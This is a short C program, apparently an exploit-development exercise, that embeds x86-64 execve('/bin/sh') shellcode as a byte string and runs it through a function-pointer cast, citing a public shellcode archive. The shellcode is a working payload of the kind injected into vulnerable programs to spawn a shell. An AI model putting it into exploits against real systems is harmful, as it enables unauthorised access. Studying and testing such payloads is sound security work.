/* i386-64 
http://shell-storm.org/shellcode/files/shellcode-806.php

32 bits: (Just for Reference)
http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html
*/

#include <stdio.h>
#include <string.h>

char code[] = 
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main()
{
    printf("Attempt to Enter the shell\n");
    int (*func) ();
    func = (int (*) ()) code;
    (int) (*func) ();
    return 0;
}
